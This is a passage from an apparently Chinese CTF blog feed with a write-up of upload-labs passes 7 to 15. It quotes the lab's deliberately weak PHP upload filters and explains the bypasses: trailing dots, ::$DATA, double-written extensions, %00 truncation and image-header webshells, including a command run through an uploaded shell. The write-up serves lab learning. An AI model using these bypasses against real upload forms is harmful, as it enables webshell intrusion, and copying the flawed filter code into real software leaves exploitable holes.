class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>差别就是这次没有去掉末尾的**<code>.</code>**</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130152607599.png" alt="image-20201130152607599"></p>
<p>所以导致可以使用<code>7.php.</code>绕过</p>
<blockquote>
<p>  Windows会自动去掉后缀名中最后的 .</p>
</blockquote>
<h3 id="绕过-6"><a href="#绕过-6" class="headerlink" title="绕过"></a>绕过</h3><p>windows 。。。。。 emmmmm 。。。。 你懂的</p>
<h2 id="pass08"><a href="#pass08" class="headerlink" title="pass08"></a>pass08</h2><h3 id="源代码-7"><a href="#源代码-7" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里缺少的是 去掉字符串 <strong><code>::$DATA</code></strong></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130153110084.png" alt="image-20201130153110084"></p>
<blockquote>
<p>  php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p>
</blockquote>
<h3 id="绕过-7"><a href="#绕过-7" class="headerlink" title="绕过"></a>绕过</h3><p>Windows。。。</p>
<h2 id="pass09"><a href="#pass09" class="headerlink" title="pass09"></a>pass09</h2><h3 id="源代码-8"><a href="#源代码-8" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>区别就在于，这次的文件名用的是之前的文件名，而不是<code>time+rand+拓展名</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130154011911.png" alt="image-20201130154011911"></p>
<blockquote>
<p>  注：下面的%20 代指一个空格</p>
</blockquote>
<p>如果<code>file_name</code>后缀名是<code>.php</code>或者<code>.php.</code>或者<code>.php%20</code>都可以绕过，但是<code>.php.</code>和<code>.php%20</code>会被<code>deldot</code>和<code>trim</code>函数去掉末尾的<code>.</code>和<code>%20</code>，为了防止如此，所以可以在后面加入一个<code>%20</code>或<code>.</code>即 <code>.php.%20</code>或<code>.php%20.</code>，但是<code>.php%20.</code>会在后面的<code>trim</code>函数中被去掉末尾的空格，所以考虑<code>.php.%20</code>，为了绕过第一个<code>trim</code>函数，防止<code>.</code>被去掉，所以在<code>.php.%20</code>的后面再加上一个<code>.</code>，变成<code>.php.%20.</code></p>
<p><code>.php.%20. --trim--&gt; .php.%20. --deldot--&gt; .php.%20 --trim --&gt; .php.</code>绕过了黑名单，并且最后的文件名为<code>.php.%20</code></p>
<h3 id="绕过-8"><a href="#绕过-8" class="headerlink" title="绕过"></a>绕过</h3><p>有待测试（</p>
<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><h3 id="源代码-9"><a href="#源代码-9" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由一系列的删减措施，变成了<code>replace</code>替换，但是由于只是经过了一次替换，没有递归的操作，如果双写后缀名<code>.php ==&gt; .pphphp</code>，那么在程序的运行逻辑中，<code>.p(php)hp</code>括号内的<code>php</code>将被替换成空字符，变成<code>.php</code>，由此绕过</p>
<h3 id="绕过-9"><a href="#绕过-9" class="headerlink" title="绕过"></a>绕过</h3><p>上传时把文件名更改为<code>10.pphphp</code>，经过后段代码后，变成<code>10.php</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201201192316165.png" alt="image-20201201192316165"></p>
<p>访问<code>http://ip:port/upload/10.php?c=id</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201201192359070.png" alt="image-20201201192359070"></p>
<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用了白名单，只允许上传<code>.jpg .png gif</code>后缀的文件，而且贴心的给了一个<code>save_path</code>参数</p>
<p>问题就出在<code>save_path</code></p>
<p><strong>当 php 版本小于 5.3.4，并且<code>magic_quote_gpc</code>处于OFF状态时，文件名会被%00字符截断</strong>，即如果文件名为<code>11.php%00.jpg</code>，会被解释成<code>11.php</code></p>
<h3 id="绕过-10"><a href="#绕过-10" class="headerlink" title="绕过"></a>绕过</h3><p>在<code>save_path</code>参数构造<code>../upload/11.php%00</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201201195722186.png" alt="image-20201201195722186"></p>
<blockquote>
<p>  注：由于docker内靶机的php版本为5.5.38，已经修复了该问题，无法复现</p>
</blockquote>
<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和上题是一样的，无非就是从<code>$_GET</code>变成了<code>$_POST</code></p>
<p>在<code>burp suite</code>的<code>hex</code>部分在文件名后面增加一个<code>%00</code>即可绕过</p>
<h3 id="绕过-11"><a href="#绕过-11" class="headerlink" title="绕过"></a>绕过</h3><p>同上题一样，由于php版本问题，无法复现</p>
<h2 id="pass13-15"><a href="#pass13-15" class="headerlink" title="pass13-15"></a>pass13-15</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题要求上传图片马，由于绕过思路类似，所以只上传一个（</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202194401460.png" alt="image-20201202194401460"></p>
<p>这里出问题就出在<code>getReailFileType</code>函数，这个函数只检查了文件的头两个字节，所以加上<code>GIF89a</code>（即文件头）即可绕过</p>
<p>当然，有个更加简单的办法——直接找一张真实的图片，在文件最后，写上木马。</p>
<p>这个方法可以直接pass13-15</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202194747675.png" alt="image-20201202194747675"></p>
<blockquote>
<p>  由于队内web说 18，19 不推荐做，那就太监了（</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2dl_runtime_resolve</title>
    <url>//ret2dl.html</url>
    <content><![CDATA[<p>试了试rop系列最麻烦的一个（大概？）</p>
<a id="more"></a>

